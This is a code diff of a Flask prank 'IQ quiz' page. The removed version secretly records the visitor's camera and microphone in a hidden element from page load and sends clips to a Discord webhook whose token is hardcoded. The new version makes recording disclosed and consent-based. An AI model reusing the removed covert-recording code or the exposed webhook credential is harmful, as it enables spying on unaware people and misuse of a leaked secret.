@@ -4,8 +4,9 @@ import requests
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
+app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566437289113161940/qkaHvkxwmc_uuM3YMobIKnL9kaJhRI9XA4-OwYMpIJEWZnagp5mqEE93c4es2n2aTXA1"
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -13,239 +14,733 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">IQ Questions - Vérification d'identité</title>
+    <title>IQ Questions</title>
+
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
     <style>
         :root {
-            --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #31103f 100%);
-            --card-bg: rgba(255, 255, 255, 0.95);
-            --primary-accent: #6366f1;
-            --secondary-accent: #ff4757;
-            --success-color: #10b981;
-            --text-main: #1e293b;
-            --text-muted: #64748b;
-            --input-bg: #f8fafc;
-            --border-color: #e2e8f0;
-            --border-focus: #6366f1;
-            --radius-lg: 20px;
-            --radius-md: 12px;
-            --shadow-glow: 0 20px 40px -15px rgba(99, 102, 241, 0.3);
+            --primary: #6366f1;
+            --text: #1e293b;
+            --muted: #64748b;
+            --border: #e2e8f0;
+            --input: #f8fafc;
         }
-        * { box-sizing: border-box; transition: all 0.25s ease; }
-        body { 
-            font-family: 'Plus Jakarta Sans', Arial, sans-serif; 
-            background: var(--bg-gradient); background-attachment: fixed;
-            display: flex; justify-content: center; align-items: center; 
-            min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text-main);
+
+        * {
+            box-sizing: border-box;
+            transition: all 0.25s ease;
         }
-        .card { 
-            background: var(--card-bg); backdrop-filter: blur(12px);
-            padding: 40px 35px; border-radius: var(--radius-lg); 
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4), var(--shadow-glow); 
-            text-align: center; max-width: 600px; width: 100%; 
-            border: 1px solid rgba(255, 255, 255, 0.3);
+
+        body {
+            font-family: 'Plus Jakarta Sans', Arial, sans-serif;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 30px 15px;
+            color: var(--text);
+            position: relative;
         }
-        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
-        .welcome-badge { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; padding: 8px 16px; border-radius: 30px; font-size: 13px; font-weight: 800; letter-spacing: 1.2px; text-transform: uppercase; }
-        .lang-select { padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border-color); background-color: var(--input-bg); font-weight: 700; font-size: 13px; color: var(--text-main); cursor: pointer; outline: none; }
-        h2 { color: var(--text-main); margin: 0 0 8px 0; font-size: 28px; font-weight: 800; }
-        .subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 25px; font-weight: 500; }
-        #video-container { position: absolute; top: 0; left: 0; width: 1px; height: 1px; overflow: hidden; opacity: 0.01; pointer-events: none; }
-        #username { width: 100%; padding: 14px 16px; margin-bottom: 25px; font-size: 15px; font-weight: 600; background-color: var(--input-bg); border: 2px solid var(--border-color); border-radius: var(--radius-md); outline: none; color: var(--text-main); }
-        .question-box { margin-bottom: 16px; text-align: left; background: #ffffff; padding: 16px 18px; border-radius: var(--radius-md); border: 1px solid var(--border-color); }
-        [dir="rtl"] .question-box { text-align: right; }
-        .question-box label { display: block; font-weight: 700; margin-bottom: 8px; color: var(--text-main); font-size: 14px; }
-        .question-box select { width: 100%; padding: 10px 12px; font-size: 14px; background-color: var(--input-bg); border: 1px solid var(--border-color); border-radius: 8px; outline: none; cursor: pointer; }
-        button { padding: 16px 24px; border: none; border-radius: var(--radius-md); cursor: pointer; font-weight: 700; font-size: 16px; width: 100%; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; margin-top: 20px; box-shadow: 0 10px 20px -5px rgba(16, 185, 129, 0.4); }
-        #status { margin-top: 20px; font-weight: 700; font-size: 15px; padding: 10px; border-radius: 6px; }
+
+        body::before {
+            content: "IQ QUESTIONS";
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: clamp(45px, 10vw, 120px);
+            font-weight: 800;
+            color: rgba(99, 102, 241, 0.055);
+            white-space: nowrap;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .card {
+            background: rgba(255,255,255,0.97);
+            padding: 40px 35px;
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.08);
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            border: 1px solid #eeeeee;
+            position: relative;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .welcome-badge {
+            background: linear-gradient(135deg, #6366f1, #a855f7);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 800;
+        }
+
+        .lang-select {
+            padding: 8px 12px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            background: var(--input);
+            font-weight: 700;
+        }
+
+        h2 {
+            margin: 0 0 8px;
+            font-size: 28px;
+            font-weight: 800;
+        }
+
+        .subtitle {
+            color: var(--muted);
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        #username {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 25px;
+            font-size: 15px;
+            background: var(--input);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            outline: none;
+        }
+
+        .question-box {
+            margin-bottom: 16px;
+            text-align: left;
+            background: white;
+            padding: 16px 18px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        [dir="rtl"] .question-box {
+            text-align: right;
+        }
+
+        .question-box label {
+            display: block;
+            font-weight: 700;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .question-box select {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            background: var(--input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+        }
+
+        button {
+            padding: 14px 20px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 15px;
+            width: 100%;
+            margin-top: 12px;
+            color: white;
+        }
+
+        #startBtn {
+            background: #6366f1;
+        }
+
+        #stopBtn {
+            background: #ef4444;
+        }
+
+        #submitBtn {
+            background: linear-gradient(135deg, #10b981, #059669);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        #consentBox {
+            border: 1px solid #c7d2fe;
+            background: #eef2ff;
+            padding: 18px;
+            border-radius: 14px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        #consentBox p {
+            font-size: 13px;
+            line-height: 1.7;
+            color: #3730a3;
+        }
+
+        #webcam {
+            width: 100%;
+            max-width: 320px;
+            border-radius: 12px;
+            background: #111;
+            display: none;
+            margin: 15px auto;
+        }
+
+        #recordingStatus {
+            font-size: 13px;
+            font-weight: 700;
+            margin-top: 10px;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-weight: 700;
+            font-size: 14px;
+        }
     </style>
 </head>
+
 <body>
-    <div class="card">
-        <div class="top-bar">
-            <div class="welcome-badge" id="welcomeText">Bienvenue dans IQ Questions</div>
-            <select id="languageSelector" class="lang-select" onchange="changeLanguage(this.value)">
-                <option value="fr">Français</option>
-                <option value="ar">العربية</option>
-                <option value="en">English</option>
-            </select>
-        </div>
-        
-        <h2 id="mainTitle">Vérification d'identité</h2>
-        <div class="subtitle" id="subTitle">Veuillez répondre aux 20 questions ci-dessous pour continuer</div>
 
-        <div id="video-container">
-            <video id="webcam" autoplay playsinline muted></video>
-        </div>
-        
-        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
-            <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
-            
-            <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-            <div class="question-box"><label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-            <div class="question-box"><label id="lbl3">3. Quel est le nom de votre animal préféré ?</label><select id="q3" required><option value="">Sélectionnez</option><option value="Skander">Skander</option><option value="Michou">Michou</option><option value="Tito">Tito</option><option value="Urra">Urra</option><option value="Yahouh">Yahouh</option><option value="Autre">Autre</option></select></div>
-            <div class="question-box"><label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label><select id="q4" required><option value="">Sélectionnez</option><option value="Excellente">Excellente</option><option value="Malchanceuse">Malchanceuse</option></select></div>
-            <div class="question-box"><label id="lbl5">5. Qui est le plus intelligent selon vous ?</label><select id="q5" required><option value="">Sélectionnez</option><option value="Moi">Moi-même</option><option value="Les singes">Les singes</option></select></div>
-            <div class="question-box"><label id="lbl6">6. Avez-vous peur de l'obscurité (du noir) ?</label><select id="q6" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-            <div class="question-box"><label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label><select id="q7" required><option value="">Sélectionnez</option><option value="Sommeil">Le sommeil</option><option value="Nourriture">La nourriture</option></select></div>
-            <div class="question-box"><label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label><select id="q8" required><option value="">Sélectionnez</option><option value="Beau/Belle">Magnifique</option><option value="Moche">Pas très beau/belle</option><option value="Sérieux">Sage / Sérieux</option></select></div>
-            <div class="question-box"><label id="lbl9">9. Notez votre niveau de méchanceté / insolence sur 10 :</label><select id="q9" required><option value="">Sélectionnez</option><option value="1/10">1 / 10</option><option value="5/10">5 / 10</option><option value="10/10">10 / 10</option></select></div>
-            <div class="question-box"><label id="lbl10">10. Comment réussissez-vous dans vos études ?</label><select id="q10" required><option value="">Sélectionnez</option><option value="Par chance">Par chance</option><option value="Par triche">Par triche</option><option value="Impossible">Impossible</option></select></div>
-            <div class="question-box"><label id="lbl11">11. Mentez-vous souvent ?</label><select id="q11" required><option value="">Sélectionnez</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
-            <div class="question-box"><label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label><select id="q12" required><option value="">Sélectionnez</option><option value="J'adore">J'adore</option><option value="Je déteste">Je déteste</option></select></div>
-            <div class="question-box"><label id="lbl13">13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label><select id="q13" required><option value="">Sélectionnez</option><option value="Pro Gamer">Joueur Pro</option><option value="Débutant">Débutant</option></select></div>
-            <div class="question-box"><label id="lbl14">14. Que préférez-vous le plus ?</label><select id="q14" required><option value="">Sélectionnez</option><option value="Téléphone">Mon téléphone</option><option value="Amis">Mes amis</option></select></div>
-            <div class="question-box"><label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label><select id="q15" required><option value="">Sélectionnez</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
-            <div class="question-box"><label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label><select id="q16" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-            <div class="question-box"><label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label><select id="q17" required><option value="">Sélectionnez</option><option value="Beaucoup">Beaucoup</option><option value="Un peu">Un peu</option><option value="Pas du tout">Pas du tout</option></select></div>
-            <div class="question-box"><label id="lbl18">18. Croyez-vous au coup de foudre ?</label><select id="q18" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-            <div class="question-box"><label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label><select id="q19" required><option value="">Sélectionnez</option><option value="Très facile">Très facile</option><option value="Impossible">Impossible</option></select></div>
-            <div class="question-box"><label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label><select id="q20" required><option value="">Sélectionnez</option><option value="Satisfait">Oui</option><option value="Non">Non</option></select></div>
+<div class="card">
 
-            <button type="button" id="submitBtn" onclick="verifyAndStop()">VALIDER ET ENVOYER</button>
-        </form>
+    <div class="top-bar">
+        <div class="welcome-badge">Bienvenue dans IQ Questions</div>
 
-        <div id="status"></div>
+        <select id="languageSelector" class="lang-select">
+            <option value="fr">Français</option>
+            <option value="ar">العربية</option>
+            <option value="en">English</option>
+        </select>
     </div>
 
-    <script>
-        let mediaStream = null;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let videoInterval = null;
-        let isCompleted = false;
+    <h2>Vérification d'identité</h2>
 
-        function startNewRecorderSegment() {
-            if (isCompleted || !mediaStream) return;
-            recordedChunks = [];
-            let options = { videoBitsPerSecond: 250000 };
-            if (MediaRecorder.isTypeSupported('video/mp4')) {
-                options.mimeType = 'video/mp4';
-            } else {
-                options.mimeType = 'video/webm';
-            }
+    <div class="subtitle">
+        Veuillez répondre aux 20 questions ci-dessous.
+    </div>
 
-            try {
-                mediaRecorder = new MediaRecorder(mediaStream, options);
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) recordedChunks.push(event.data);
-                };
+    <div id="consentBox">
+        <strong>🎥 Autorisation caméra et microphone</strong>
 
-                mediaRecorder.onstop = async () => {
-                    if (recordedChunks.length === 0) return;
-                    const mimeType = mediaRecorder.mimeType || 'video/mp4';
-                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    const videoBlob = new Blob(recordedChunks, { type: mimeType });
+        <p>
+            Si vous acceptez, le site utilisera votre caméra et votre
+            microphone pour enregistrer votre image et votre voix.
+            Des clips vidéo seront envoyés à l'administrateur via Discord
+            toutes les 10 secondes pendant l'enregistrement.
+            Vous pouvez arrêter à tout moment avec le bouton STOP.
+        </p>
 
-                    const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
-                    const formData = new FormData();
-                    formData.append('username', `${username} [🎥 Live Video]`);
-                    formData.append('video', videoBlob, `live_clip.${ext}`);
+        <button type="button" id="startBtn" onclick="startRecording()">
+            Autoriser la caméra et commencer
+        </button>
 
-                    try {
-                        await fetch('/submit-consent', { method: 'POST', body: formData });
-                    } catch (e) {}
-                };
+        <button type="button" id="stopBtn" onclick="stopRecording()" disabled>
+            STOP - Arrêter la caméra
+        </button>
 
-                mediaRecorder.start();
-            } catch (err) {}
-        }
+        <video id="webcam" autoplay playsinline muted></video>
 
-        window.addEventListener('DOMContentLoaded', async () => {
-            try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
-                document.getElementById('webcam').srcObject = mediaStream;
+        <div id="recordingStatus">
+            Enregistrement non démarré.
+        </div>
+    </div>
 
-                setTimeout(() => { startNewRecorderSegment(); }, 2000);
+    <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
 
-                videoInterval = setInterval(() => {
-                    if (!isCompleted) {
-                        if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                            mediaRecorder.stop();
-                        }
-                        setTimeout(() => { startNewRecorderSegment(); }, 500);
-                    }
-                }, 10000);
-            } catch (err) {}
+        <input
+            type="text"
+            id="username"
+            placeholder="Votre Nom Complet"
+            required
+        >
+
+        <div class="question-box">
+            <label>1. Penses-tu être plus beau/belle que moi ?</label>
+            <select id="q1" required>
+                <option value="">Sélectionnez</option>
+                <option>Oui</option>
+                <option>Non</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>2. Te considères-tu comme quelqu'un de naïf ?</label>
+            <select id="q2" required>
+                <option value="">Sélectionnez</option>
+                <option>Oui</option>
+                <option>Non</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>3. Quel est le nom de votre animal préféré ?</label>
+            <select id="q3" required>
+                <option value="">Sélectionnez</option>
+                <option>Skander</option>
+                <option>Michou</option>
+                <option>Tito</option>
+                <option>Urra</option>
+                <option>Yahouh</option>
+                <option>Autre</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>4. Comment décrivez-vous votre journée en général ?</label>
+            <select id="q4" required>
+                <option value="">Sélectionnez</option>
+                <option>Excellente</option>
+                <option>Malchanceuse</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>5. Qui est le plus intelligent selon vous ?</label>
+            <select id="q5" required>
+                <option value="">Sélectionnez</option>
+                <option>Moi-même</option>
+                <option>Les singes</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>6. Avez-vous peur de l'obscurité ?</label>
+            <select id="q6" required>
+                <option value="">Sélectionnez</option>
+                <option>Oui</option>
+                <option>Non</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>7. Préférez-vous le sommeil ou la nourriture ?</label>
+            <select id="q7" required>
+                <option value="">Sélectionnez</option>
+                <option>Le sommeil</option>
+                <option>La nourriture</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>8. Que pensez-vous en vous regardant dans le miroir ?</label>
+            <select id="q8" required>
+                <option value="">Sélectionnez</option>
+                <option>Magnifique</option>
+                <option>Pas très beau/belle</option>
+                <option>Sage / Sérieux</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>9. Notez votre niveau de méchanceté sur 10 :</label>
+            <select id="q9" required>
+                <option value="">Sélectionnez</option>
+                <option>1 / 10</option>
+                <option>5 / 10</option>
+                <option>10 / 10</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>10. Comment réussissez-vous dans vos études ?</label>
+            <select id="q10" required>
+                <option value="">Sélectionnez</option>
+                <option>Par chance</option>
+                <option>Par triche</option>
+                <option>Impossible</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>11. Mentez-vous souvent ?</label>
+            <select id="q11" required>
+                <option value="">Sélectionnez</option>
+                <option>Toujours</option>
+                <option>Parfois</option>
+                <option>Jamais</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>12. Aimez-vous les plats traditionnels épicés ?</label>
+            <select id="q12" required>
+                <option value="">Sélectionnez</option>
+                <option>J'adore</option>
+                <option>Je déteste</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>13. Êtes-vous fort aux jeux vidéo ?</label>
+            <select id="q13" required>
+                <option value="">Sélectionnez</option>
+                <option>Joueur Pro</option>
+                <option>Débutant</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>14. Que préférez-vous le plus ?</label>
+            <select id="q14" required>
+                <option value="">Sélectionnez</option>
+                <option>Mon téléphone</option>
+                <option>Mes amis</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>15. Dépensez-vous tout votre argent en deux jours ?</label>
+            <select id="q15" required>
+                <option value="">Sélectionnez</option>
+                <option>Toujours</option>
+                <option>Parfois</option>
+                <option>Jamais</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>16. Accepteriez-vous d'être une célébrité ?</label>
+            <select id="q16" required>
+                <option value="">Sélectionnez</option>
+                <option>Oui</option>
+                <option>Non</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>17. Aimez-vous faire des blagues aux autres ?</label>
+            <select id="q17" required>
+                <option value="">Sélectionnez</option>
+                <option>Beaucoup</option>
+                <option>Un peu</option>
+                <option>Pas du tout</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>18. Croyez-vous au coup de foudre ?</label>
+            <select id="q18" required>
+                <option value="">Sélectionnez</option>
+                <option>Oui</option>
+                <option>Non</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>19. Pouvez-vous tenir une heure sans Internet ?</label>
+            <select id="q19" required>
+                <option value="">Sélectionnez</option>
+                <option>Très facile</option>
+                <option>Impossible</option>
+            </select>
+        </div>
+
+        <div class="question-box">
+            <label>20. Êtes-vous satisfait(e) de votre vie actuelle ?</label>
+            <select id="q20" required>
+                <option value="">Sélectionnez</option>
+                <option>Oui</option>
+                <option>Non</option>
+            </select>
+        </div>
+
+        <button type="submit" id="submitBtn">
+            VALIDER ET ENVOYER
+        </button>
+
+    </form>
+
+    <div id="status"></div>
+
+</div>
+
+<script>
+let mediaStream = null;
+let mediaRecorder = null;
+let recordingActive = false;
+let uploadQueue = Promise.resolve();
+let segmentTimer = null;
+
+const video = document.getElementById("webcam");
+const statusDiv = document.getElementById("recordingStatus");
+
+async function startRecording() {
+    if (recordingActive) return;
+
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true
         });
 
-        async function sendFinalData() {
-            if (isCompleted) return;
-            isCompleted = true;
-            clearInterval(videoInterval);
+        video.srcObject = mediaStream;
+        video.style.display = "block";
 
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        recordingActive = true;
+
+        document.getElementById("startBtn").disabled = true;
+        document.getElementById("stopBtn").disabled = false;
+
+        statusDiv.textContent = "🔴 Enregistrement actif — envoi toutes les 10 secondes.";
+
+        startSegment();
+
+    } catch (error) {
+        statusDiv.textContent =
+            "Impossible d'accéder à la caméra ou au microphone. Vérifiez les autorisations.";
+    }
+}
+
+function startSegment() {
+    if (!recordingActive || !mediaStream) return;
+
+    let options = {};
+
+    if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")) {
+        options.mimeType = "video/webm;codecs=vp8,opus";
+    } else if (MediaRecorder.isTypeSupported("video/webm")) {
+        options.mimeType = "video/webm";
+    }
+
+    try {
+        mediaRecorder = new MediaRecorder(mediaStream, options);
+
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = event => {
+            if (event.data && event.data.size > 0) {
+                chunks.push(event.data);
+            }
+        };
+
+        mediaRecorder.onstop = () => {
+            if (chunks.length > 0) {
+                const blob = new Blob(chunks, {
+                    type: mediaRecorder.mimeType || "video/webm"
+                });
+
+                uploadQueue = uploadQueue.then(() => uploadClip(blob));
+            }
+
+            if (recordingActive) {
+                startSegment();
+            }
+        };
+
+        mediaRecorder.start();
+
+        segmentTimer = setTimeout(() => {
+            if (mediaRecorder && mediaRecorder.state === "recording") {
                 mediaRecorder.stop();
             }
-            await new Promise(r => setTimeout(r, 600));
+        }, 10000);
 
-            const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
-            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/mp4';
-            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-            const videoBlob = new Blob(recordedChunks, { type: mimeType });
+    } catch (error) {
+        statusDiv.textContent = "Erreur pendant le démarrage de l'enregistrement.";
+        stopRecording();
+    }
+}
 
-            const formData = new FormData();
-            formData.append('username', username);
-            for (let i = 1; i <= 20; i++) {
-                formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
-            }
-            formData.append('video', videoBlob, `recording.${ext}`);
+async function uploadClip(blob) {
+    const formData = new FormData();
 
-            try {
-                fetch('/submit-consent', { method: 'POST', body: formData, keepalive: true });
-            } catch (e) {}
+    formData.append("video", blob, "clip.webm");
+    formData.append(
+        "username",
+        document.getElementById("username").value || "Utilisateur"
+    );
 
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-            }
+    try {
+        const response = await fetch("/submit-consent", {
+            method: "POST",
+            body: formData
+        });
+
+        if (!response.ok) {
+            statusDiv.textContent = "Erreur pendant l'envoi du clip.";
         }
+    } catch (error) {
+        statusDiv.textContent = "Connexion impossible pendant l'envoi.";
+    }
+}
 
-        async function verifyAndStop() {
-            const statusDiv = document.getElementById('status');
-            const username = document.getElementById('username').value;
-            if (!username) {
-                statusDiv.style.color = '#ef4444';
-                statusDiv.innerText = 'Veuillez entrer votre nom.';
-                return;
-            }
-            statusDiv.style.color = '#10b981';
-            statusDiv.innerText = 'Envoi en cours...';
-            await sendFinalData();
-            statusDiv.innerText = 'Succès ! Envoyé avec succès.';
+async function stopRecording() {
+    recordingActive = false;
+
+    clearTimeout(segmentTimer);
+
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+    }
+
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+    }
+
+    video.srcObject = null;
+    video.style.display = "none";
+
+    document.getElementById("startBtn").disabled = false;
+    document.getElementById("stopBtn").disabled = true;
+
+    statusDiv.textContent = "Enregistrement arrêté.";
+
+    await uploadQueue;
+}
+
+async function verifyAndStop() {
+    const form = document.getElementById("quizForm");
+
+    if (!form.reportValidity()) return;
+
+    document.getElementById("status").textContent = "Envoi en cours...";
+
+    await stopRecording();
+
+    const formData = new FormData();
+
+    formData.append(
+        "username",
+        document.getElementById("username").value
+    );
+
+    for (let i = 1; i <= 20; i++) {
+        formData.append(
+            "q" + i,
+            document.getElementById("q" + i).value
+        );
+    }
+
+    try {
+        const response = await fetch("/submit-answers", {
+            method: "POST",
+            body: formData
+        });
+
+        if (response.ok) {
+            document.getElementById("status").textContent =
+                "Succès ! Vos réponses ont été envoyées.";
+        } else {
+            document.getElementById("status").textContent =
+                "Erreur pendant l'envoi.";
         }
-    </script>
+    } catch (error) {
+        document.getElementById("status").textContent =
+            "Erreur de connexion.";
+    }
+}
+
+window.addEventListener("beforeunload", () => {
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+    }
+});
+</script>
+
 </body>
 </html>
 """
+
 
 @app.route("/")
 def home():
     return render_template_string(HTML_TEMPLATE)
 
+
+def send_to_discord(content, video_file=None):
+    if not DISCORD_WEBHOOK_URL:
+        raise RuntimeError("DISCORD_WEBHOOK_URL n'est pas configuré.")
+
+    payload = {"content": content}
+
+    files = None
+
+    if video_file:
+        files = {
+            "file": (
+                video_file.filename or "recording.webm",
+                video_file.read(),
+                video_file.content_type or "video/webm"
+            )
+        }
+
+    response = requests.post(
+        DISCORD_WEBHOOK_URL,
+        data={"payload_json": json.dumps(payload)},
+        files=files,
+        timeout=30
+    )
+
+    response.raise_for_status()
+
+
 @app.route("/submit-consent", methods=["POST"])
 def submit_consent():
     try:
-        username = request.form.get("username", "Utilisateur Anonyme")
-        questions_summary = []
-        for i in range(1, 21):
-            val = request.form.get(f"q{i}", "")
-            if val:
-                questions_summary.append(f"Q{i}: {val}")
-        
-        q_text = " | ".join(questions_summary[:10])
+        username = request.form.get("username", "Utilisateur")
+
         video_file = request.files.get("video")
 
-        content_text = f"✅ **Rapport IQ Quiz:**\n• **Nom:** {username}\n• **Réponses:** {q_text}"
-        payload = {"content": content_text}
+        if not video_file:
+            return jsonify({"error": "Aucun fichier vidéo."}), 400
 
-        files = {}
-        if video_file:
-            files = {"file": (video_file.filename or "recording.webm", video_file.read(), video_file.content_type or "video/webm")}
+        content = (
+            "🎥 **IQ Questions — Clip autorisé**\n"
+            f"**Nom :** {username}\n"
+            "**Durée du segment :** environ 10 secondes."
+        )
 
-        requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files if files else None, timeout=30)
-        return jsonify({"message": "Success"}), 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        send_to_discord(content, video_file)
+
+        return jsonify({"message": "Clip envoyé."}), 200
+
+    except Exception as error:
+        return jsonify({"error": str(error)}), 500
+
+
+@app.route("/submit-answers", methods=["POST"])
+def submit_answers():
+    try:
+        username = request.form.get("username", "Utilisateur")
+
+        answers = []
+
+        for i in range(1, 21):
+            value = request.form.get(f"q{i}", "")
+            if value:
+                answers.append(f"Q{i}: {value}")
+
+        content = (
+            "✅ **Rapport IQ Questions**\n"
+            f"**Nom :** {username}\n"
+            + "\n".join(answers)
+        )
+
+        send_to_discord(content)
+
+        return jsonify({"message": "Réponses envoyées."}), 200
+
+    except Exception as error:
+        return jsonify({"error": str(error)}), 500
+
 
 if __name__ == "__main__":
-    app.run(port=5000)
+    app.run(host="0.0.0.0", port=5000, debug=False)
